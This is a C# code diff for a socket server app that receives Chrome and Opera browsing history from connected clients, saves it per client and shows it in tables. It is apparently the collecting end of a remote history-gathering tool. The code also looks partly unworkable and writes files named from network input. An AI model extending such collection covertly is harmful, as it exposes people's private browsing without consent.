@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Data.SQLite;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -20,7 +21,6 @@ namespace Info
         {
             server.socket.Bind(server.ipPoint);
             server.socket.Listen(10);
-
             Task.Factory.StartNew(() => Connect());
             InitializeComponent();
         }
@@ -48,9 +48,10 @@ namespace Info
             {
                 this.listBox1.Invoke((MethodInvoker)(() => this.listBox1.Items.Add(msg)));
             }
-            GetHistory();
+            GetHistoryChrome();
+            GetHistoryOpera();
         }
-        public void GetHistory()
+        public void GetHistoryChrome()
         {
             var msg = server.GetMsg();
             if (!Directory.Exists("Google"))
@@ -58,7 +59,15 @@ namespace Info
 
             File.WriteAllText($@"Google\{this.listBox1.Items[this.listBox1.Items.Count - 1]}", msg);
         }
-        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
+        public void GetHistoryOpera()
+        {
+            var msg = server.GetMsg();
+            if (!Directory.Exists("Opera"))
+                Directory.CreateDirectory("Opera");
+
+            File.WriteAllText($@"Opera\{this.listBox1.Items[this.listBox1.Items.Count - 1]}", msg);
+        }
+        private void listBox1_DoubleClick(object sender, EventArgs e)
         {
             if ((sender as ListBox) != null)
             {
@@ -68,6 +77,45 @@ namespace Info
                     DataSet dataset = new DataSet();
                     adapter.Fill(dataset);
                     dataGridView1.DataSource = dataset.Tables[0];
+                }
+                if (File.Exists($@"Opera\{(sender as ListBox)?.SelectedItem.ToString()}"))
+                {
+                    SQLiteDataAdapter adapter = JsonSerializer.Deserialize<SQLiteDataAdapter>(File.ReadAllText($@"Opera\{(sender as ListBox)?.SelectedItem.ToString()}"));
+                    DataSet dataset = new DataSet();
+                    adapter.Fill(dataset);
+                    dataGridView2.DataSource = dataset.Tables[0];
+                }
+            }
+        }
+
+        private void dataGridView1_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
+        {
+            if ((sender as DataGridView).CurrentCell.Value.ToString().ToLower().Contains("http"))
+            {
+                Process.Start("chrome", (sender as DataGridView)?.CurrentCell.Value.ToString());
+            }
+        }
+
+        private void dataGridView2_CellMouseDoubleClick(object sender, DataGridViewCellMouseEventArgs e)
+        {
+            if ((sender as DataGridView).CurrentCell.Value.ToString().ToLower().Contains("http"))
+            {
+                if (MessageBox.Show("Start this link?", "Will be started this link", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                {
+                    Process.Start("chrome", (sender as DataGridView)?.CurrentCell.Value.ToString());
+                }
+            }
+        }
+
+
+
+        private void dataGridView2_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
+        {
+            if ((sender as DataGridView).CurrentCell.Value.ToString().ToLower().Contains("http"))
+            {
+                if (MessageBox.Show("Start this link?", "Will be started this link", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                {
+                    Process.Start("chrome", (sender as DataGridView)?.CurrentCell.Value.ToString());
                 }
             }
         }
